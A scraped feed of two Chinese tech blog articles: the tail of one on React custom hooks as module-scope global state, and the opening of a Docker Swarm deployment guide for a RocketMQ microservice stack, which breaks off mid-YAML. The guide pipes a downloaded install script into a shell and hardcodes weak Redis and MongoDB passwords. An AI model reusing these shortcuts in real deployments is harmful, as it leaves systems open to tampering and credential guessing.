  <span class="hljs-comment">// 新建状态</span>
  const <span class="hljs-selector-attr">[state, setState]</span> = <span class="hljs-built_in">useState</span>(initialValue);

  <span class="hljs-comment">// 批量更新（类似setState的函数式更新）</span>
  const setGlobalState = <span class="hljs-built_in">useCallback</span>((updater) =&gt; {
    <span class="hljs-built_in">setState</span>(prev =&gt; {
      const nextState = typeof updater === 'function' ? updater(prev) : updater;
      <span class="hljs-comment">// 通知该状态的所有订阅者</span>
      if (subscribers.has(key)) {
        subscribers<span class="hljs-selector-class">.get</span>(key)<span class="hljs-selector-class">.forEach</span>(update =&gt; update(nextState));
      }
      return nextState;
    });
  }, <span class="hljs-selector-attr">[key]</span>);

  const globalState = { state, setGlobalState };
  globalStates<span class="hljs-selector-class">.set</span>(key, globalState);
  subscribers<span class="hljs-selector-class">.set</span>(key, new Set());

  return globalState;
}

<span class="hljs-comment">// 通用全局Hook：支持传入key和初始值</span>
export function <span class="hljs-built_in">useGlobalState</span>(key, initialValue) {
  const { state, setGlobalState } = <span class="hljs-built_in">getOrCreateGlobalState</span>(key, initialValue);

  <span class="hljs-comment">// 组件本地更新函数（触发组件重渲染）</span>
  const <span class="hljs-selector-attr">[, forceUpdate]</span> = <span class="hljs-built_in">useState</span>(state);

  <span class="hljs-comment">// 订阅状态变更：状态更新时触发组件重渲染</span>
  <span class="hljs-built_in">useEffect</span>(() =&gt; {
    const subs = subscribers<span class="hljs-selector-class">.get</span>(key);
    const update = (nextState) =&gt; <span class="hljs-built_in">forceUpdate</span>(nextState);
    subs<span class="hljs-selector-class">.add</span>(update);

    <span class="hljs-comment">// 初始触发一次渲染（同步初始状态）</span>
    <span class="hljs-built_in">forceUpdate</span>(state);

    return () =&gt; subs<span class="hljs-selector-class">.delete</span>(update);
  }, <span class="hljs-selector-attr">[key, state]</span>);

  return <span class="hljs-selector-attr">[state, setGlobalState]</span>;
}
</code></pre>
<h4 data-id="heading-13">使用方式：</h4>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 组件1：使用用户状态</span>
<span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useGlobalState</span>(<span class="hljs-string">'user'</span>, <span class="hljs-literal">null</span>);

<span class="hljs-comment">// 组件2：使用主题状态</span>
<span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useGlobalState</span>(<span class="hljs-string">'theme'</span>, <span class="hljs-string">'light'</span>);

<span class="hljs-comment">// 组件3：更新全局状态</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChangeTheme</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setTheme</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev === <span class="hljs-string">'light'</span> ? <span class="hljs-string">'dark'</span> : <span class="hljs-string">'light'</span>);
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setUser</span>({ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'李四'</span> });
};
</code></pre>
<h4 data-id="heading-14">进阶特性：</h4>
<ul>
<li>支持多状态隔离（通过<code>key</code>区分）；</li>
<li>支持函数式更新（批量修改状态）；</li>
<li>组件仅订阅自己关注的状态，性能更优。</li>
</ul>
<h2 data-id="heading-15">四、关键疑问解答：每次引入 Hook，state 会重新执行吗？</h2>
<p>这是开发者最关心的问题，我们结合示例和原理来详细解答：</p>
<h3 data-id="heading-16">1. 结论：不会重新初始化，但会重新执行 Hook 逻辑</h3>
<ul>
<li><strong>state 的初始化：仅执行一次</strong>：因为<code>globalHook</code>、<code>globalStates</code>等变量存储在<strong>模块作用域</strong>中，模块被导入时仅初始化一次，后续所有组件引入该模块并调用 Hook 时，不会重新创建这些变量，因此<code>useState</code>的初始化逻辑（<code>useState(initialValue)</code>）仅执行一次；</li>
<li><strong>Hook 逻辑的执行：每次组件渲染都会执行</strong>：组件每次重渲染时，都会重新调用自定义 Hook（如<code>useGlobalUser()</code>），但 Hook 内部的逻辑（如返回<code>globalHook</code>）是 “读取缓存”，而非 “重新创建状态”—— 因此 state 的引用不变，不会触发不必要的更新。</li>
</ul>
<h3 data-id="heading-17">2. 代码验证：打印日志看执行次数</h3>
<p>修改<code>useGlobalUser</code>优化版，添加日志：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useGlobalUser.js</span>
<span class="hljs-keyword">import</span> { useState, useCallback } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">let</span> globalHook = <span class="hljs-literal">null</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'模块初始化：执行一次'</span>); <span class="hljs-comment">// 仅打印一次</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createGlobalUserHook</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'创建全局状态：仅执行一次'</span>); <span class="hljs-comment">// 仅打印一次</span>
  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// ... 其余逻辑</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useGlobalUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'调用useGlobalUser：组件渲染时执行'</span>); <span class="hljs-comment">// 组件每次渲染都会打印</span>

  <span class="hljs-keyword">if</span> (!globalHook) {
    globalHook = <span class="hljs-title function_">createGlobalUserHook</span>();
  }

  <span class="hljs-keyword">return</span> globalHook;
}
</code></pre>
<h4 data-id="heading-18">日志输出结果：</h4>
<ol>
<li>应用启动时：打印<code>模块初始化：执行一次</code>；</li>
<li>第一个组件（如 Header）挂载时：打印<code>调用useGlobalUser：组件渲染时执行</code> → <code>创建全局状态：仅执行一次</code>；</li>
<li>第二个组件（如 Login）挂载时：打印<code>调用useGlobalUser：组件渲染时执行</code>（无 “创建全局状态” 日志）；</li>
<li>组件重渲染时（如登录后）：两个组件都会打印<code>调用useGlobalUser：组件渲染时执行</code>（仍无 “创建全局状态” 日志）。</li>
</ol>
<h4 data-id="heading-19">结论验证：</h4>
<ul>
<li>模块初始化和全局状态创建仅执行一次（state 不会重新初始化）；</li>
<li>Hook 函数本身会在组件每次渲染时执行，但仅读取缓存的状态，不会重复创建。</li>
</ul>
<h3 data-id="heading-20">3. 与普通 Hook 的区别：状态存储位置不同</h3>






























<table><thead><tr><th>特性</th><th>普通自定义 Hook（如 useCounter）</th><th>全局状态自定义 Hook（如 useGlobalUser）</th></tr></thead><tbody><tr><td>状态存储位置</td><td>组件实例的 Hook 链表中</td><td>模块作用域的闭包中</td></tr><tr><td>状态共享性</td><td>组件私有（每个组件调用创建独立状态）</td><td>跨组件共享（所有组件调用共享同一状态）</td></tr><tr><td>state 初始化次数</td><td>每个组件调用一次</td><td>模块初始化时仅一次</td></tr><tr><td>Hook 逻辑执行次数</td><td>组件每次渲染执行</td><td>组件每次渲染执行（但仅读缓存）</td></tr></tbody></table>
<h2 data-id="heading-21">五、自定义 Hook 作为全局状态的适用场景与局限性</h2>
<h3 data-id="heading-22">1. 适用场景</h3>
<ul>
<li>小型应用或中型应用的非核心状态（如用户信息、主题、权限、全局加载状态）；</li>
<li>不需要中间件、时间旅行、状态回溯等高级特性；</li>
<li>追求轻量化、无额外依赖（无需引入 Redux、Zustand 等库）；</li>
<li>跨组件共享简单状态，且组件层级不深（无需 Context 的嵌套传递）。</li>
</ul>
<h3 data-id="heading-23">2. 局限性</h3>
<ul>
<li><strong>不支持服务端渲染（SSR）</strong> ：模块作用域的状态在 SSR 中会被所有请求共享，导致状态污染（因为 SSR 是多请求共享一个模块实例）；</li>
<li><strong>状态更新缺乏可追踪性</strong>：没有 Redux DevTools 等工具支持，难以调试状态变更；</li>
<li><strong>不支持复杂状态逻辑</strong>：如异步状态流、状态依赖、批量更新优化等，需要手动实现，成本较高；</li>
<li><strong>组件卸载后状态不自动清理</strong>：模块作用域的状态会一直存在于内存中，直到应用刷新（可能导致内存泄漏，需手动清理）；</li>
<li><strong>不支持状态切片隔离</strong>：多团队协作时，容易出现状态 key 冲突（需手动规范 key 命名）。</li>
</ul>
<h2 data-id="heading-24">六、总结</h2>
<p>自定义 Hook 之所以能实现模块级全局状态，核心是<strong>模块作用域的闭包缓存</strong>—— 状态被存储在模块层面，而非组件实例，因此跨组件调用 Hook 时能共享同一状态。每次引入 Hook 后，state 不会重新初始化（仅模块初始化时执行一次），但 Hook 逻辑会在组件每次渲染时执行（仅读取缓存，无性能开销）。</p>
<p>这种方案是一把 “双刃剑”：它轻量化、易实现，适合简单场景；但缺乏高级特性和调试能力，不适合复杂应用。在实际开发中，可根据项目规模选择：</p>
<ul>
<li>小型应用 / 简单状态：用自定义 Hook（本文方案）；</li>
<li>中型应用 / 需要调试：用 Zustand、Jotai 等轻量状态库（本质是基于自定义 Hook + 闭包实现）；</li>
<li>大型应用 / 复杂状态流：用 Redux、Redux Toolkit 或 Recoil 等成熟方案。</li>
</ul>
<p>理解自定义 Hook 的全局状态原理，不仅能帮助我们灵活应对不同场景，更能深入掌握 React 的模块机制、闭包和 Hook 执行逻辑，提升 React 开发的底层认知。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 Docker Compose 到 Docker Swarm：RocketMQ 微服务项目集群部署实战指南]]></title>    <link>https://juejin.cn/post/7575735719077314566</link>    <guid>https://juejin.cn/post/7575735719077314566</guid>    <pubDate>2025-11-24T06:49:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575735719077314566" data-draft-id="7575910333400285238" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 Docker Compose 到 Docker Swarm：RocketMQ 微服务项目集群部署实战指南"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T06:49:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT橘子皮"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 Docker Compose 到 Docker Swarm：RocketMQ 微服务项目集群部署实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT橘子皮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:49:27.000Z" title="Mon Nov 24 2025 06:49:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在微服务架构日益普及的今天，单机部署已无法满足生产环境的高可用和可扩展性需求。本文将详细指导您如何将一个基于 RocketMQ 的 SpringBoot 微服务项目从单机 Docker Compose 部署升级为生产级的 Docker Swarm 集群部署。</p>
<h2 data-id="heading-0">一、Docker Swarm 架构概述</h2>
<h3 data-id="heading-1">1.1 Swarm 集群核心组件</h3>
<ul>
<li><strong>管理节点 (Manager Nodes)</strong> ：负责集群管理、服务调度</li>
<li><strong>工作节点 (Worker Nodes)</strong> ：运行容器实例</li>
<li><strong>Raft 共识算法</strong>：保证管理节点高可用</li>
<li><strong>覆盖网络 (Overlay Network)</strong> ：实现跨主机容器通信</li>
</ul>
<h3 data-id="heading-2">1.2 集群架构设计</h3>
<pre><code class="hljs language-lua" lang="lua">+<span class="hljs-comment">-----------------+</span>
                   |   负载均衡器     |
                   |   (Nginx/Haproxy) |
                   +<span class="hljs-comment">-----------------+</span>
                          |
      +<span class="hljs-comment">-----------------------------------+</span>
      |           Swarm 集群              |
      +<span class="hljs-comment">-----------------------------------+</span>
      | Manager1 | Manager2 | Manager3    |  ← 管理节点（奇数个）
      +<span class="hljs-comment">-----------------------------------+</span>
      | Worker1  | Worker2  | Worker3     |  ← 工作节点
      +<span class="hljs-comment">-----------------------------------+</span>
</code></pre>
<h2 data-id="heading-3">二、环境准备与集群初始化</h2>
<h3 data-id="heading-4">2.1 服务器规划</h3>
<p>假设我们有 3 台服务器：</p>
<ul>
<li>192.168.1.10 (manager1)</li>
<li>192.168.1.11 (worker1)</li>
<li>192.168.1.12 (worker2)</li>
</ul>
<h3 data-id="heading-5">2.2 所有节点基础环境配置</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 安装 Docker（所有节点）</span>
curl -fsSL https://get.docker.com | sh
sudo systemctl <span class="hljs-built_in">enable</span> docker
sudo systemctl start docker

<span class="hljs-comment"># 2. 开放防火墙端口</span>
sudo ufw allow 22/tcp
sudo ufw allow 2377/tcp    <span class="hljs-comment"># Swarm 管理端口</span>
sudo ufw allow 7946/tcp    <span class="hljs-comment"># 节点通信</span>
sudo ufw allow 7946/udp
sudo ufw allow 4789/udp    <span class="hljs-comment"># 覆盖网络</span>

<span class="hljs-comment"># 3. 设置主机名（可选）</span>
sudo hostnamectl set-hostname manager1
sudo hostnamectl set-hostname worker1
sudo hostnamectl set-hostname worker2
</code></pre>
<h3 data-id="heading-6">2.3 初始化 Swarm 集群</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在 manager1 上执行</span>
docker swarm init --advertise-addr 192.168.1.10

<span class="hljs-comment"># 输出示例：</span>
<span class="hljs-comment"># Swarm initialized: current node (xyz) is now a manager.</span>
<span class="hljs-comment"># To add a worker to this swarm, run the following command:</span>
<span class="hljs-comment">#     docker swarm join --token SWMTKN-1-xxx 192.168.1.10:2377</span>

<span class="hljs-comment"># 在工作节点上执行加入命令</span>
<span class="hljs-comment"># 在 worker1 和 worker2 上分别执行：</span>
docker swarm <span class="hljs-built_in">join</span> --token SWMTKN-1-xxx 192.168.1.10:2377
</code></pre>
<h3 data-id="heading-7">2.4 验证集群状态</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在管理节点查看节点状态</span>
docker node <span class="hljs-built_in">ls</span>

<span class="hljs-comment"># 输出示例：</span>
<span class="hljs-comment"># ID                           HOSTNAME   STATUS    AVAILABILITY   MANAGER STATUS   ENGINE VERSION</span>
<span class="hljs-comment"># xyz123 *   manager1   Ready     Active         Leader           20.10.12</span>
<span class="hljs-comment"># abc456     worker1    Ready     Active                          20.10.12  </span>
<span class="hljs-comment"># def789     worker2    Ready     Active                          20.10.12</span>
</code></pre>
<h2 data-id="heading-8">三、改造 Docker Compose 文件支持 Swarm</h2>
<h3 data-id="heading-9">3.1 创建 Swarm 专用配置文件</h3>
<p>创建 <code>docker-compose.swarm.yml</code>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-comment"># SpringBoot 应用服务 - 无状态，可水平扩展</span>
  <span class="hljs-attr">my-springboot-app:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">my-springboot-app:latest</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span>                    <span class="hljs-comment"># 启动3个实例</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
        <span class="hljs-attr">delay:</span> <span class="hljs-string">5s</span>
        <span class="hljs-attr">max_attempts:</span> <span class="hljs-number">3</span>
        <span class="hljs-attr">window:</span> <span class="hljs-string">120s</span>
      <span class="hljs-attr">update_config:</span>
        <span class="hljs-attr">parallelism:</span> <span class="hljs-number">1</span>              <span class="hljs-comment"># 滚动更新：每次更新1个实例</span>
        <span class="hljs-attr">delay:</span> <span class="hljs-string">10s</span>
        <span class="hljs-attr">order:</span> <span class="hljs-string">start-first</span>
      <span class="hljs-attr">resources:</span>
        <span class="hljs-attr">limits:</span>
          <span class="hljs-attr">cpus:</span> <span class="hljs-string">'0.5'</span>
          <span class="hljs-attr">memory:</span> <span class="hljs-string">512M</span>
        <span class="hljs-attr">reservations:</span>
          <span class="hljs-attr">cpus:</span> <span class="hljs-string">'0.25'</span>
          <span class="hljs-attr">memory:</span> <span class="hljs-string">256M</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.role==worker</span>       <span class="hljs-comment"># 只部署在工作节点</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">8080</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">8080</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>                  <span class="hljs-comment"># 使用host模式便于直接访问</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rocketmq.client.logRoot=/home/spring/logs/rocketmqlogs</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SPRING_PROFILES_ACTIVE=prod</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">springboot_logs:/home/spring/logs</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqnamesrv</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqbroker</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mongo</span>

  <span class="hljs-comment"># Redis 服务 - 有状态，单实例+持久化</span>
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">redis:7-alpine</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.labels.redis==true</span>    <span class="hljs-comment"># 固定部署在特定节点</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">6379</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">6379</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">redis-server</span> <span class="hljs-string">--requirepass</span> <span class="hljs-number">123456</span> <span class="hljs-string">--appendonly</span> <span class="hljs-literal">yes</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis_data:/data</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

  <span class="hljs-comment"># RocketMQ NameServer - 有状态，建议单实例</span>
  <span class="hljs-attr">rmqnamesrv:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">apache/rocketmq:5.1.0</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.labels.rocketmq==true</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">9876</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">9876</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">sh</span> <span class="hljs-string">mqnamesrv</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqnamesrv_data:/home/rocketmq/store</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

  <span class="hljs-comment"># RocketMQ Broker - 有状态，需要与NameServer同节点或网络互通</span>
  <span class="hljs-attr">rmqbroker:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">apache/rocketmq:5.1.0</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.labels.rocketmq==true</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">10911</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">10911</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">10909</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">10909</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">NAMESRV_ADDR:</span> <span class="hljs-string">"rmqnamesrv:9876"</span>
      <span class="hljs-attr">JAVA_OPTS:</span> <span class="hljs-string">" -Duser.home=/opt"</span>
      <span class="hljs-attr">JAVA_OPT_EXT:</span> <span class="hljs-string">"-server -Xms256m -Xmx256m -Xmn128m"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">bind</span>
        <span class="hljs-attr">source:</span> <span class="hljs-string">./broker.conf</span>
        <span class="hljs-attr">target:</span> <span class="hljs-string">/opt/rocketmq/conf/broker.conf</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqbroker_data:/home/rocketmq/store</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">sh</span> <span class="hljs-string">mqbroker</span> <span class="hljs-string">-c</span> <span class="hljs-string">/opt/rocketmq/conf/broker.conf</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

  <span class="hljs-comment"># MongoDB 服务 - 有状态，单实例+持久化</span>
  <span class="hljs-attr">mongo:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">mongo:5</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.labels.mongo==true</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">MONGO_INITDB_ROOT_USERNAME:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">MONGO_INITDB_ROOT_PASSWORD:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">ports:</span>
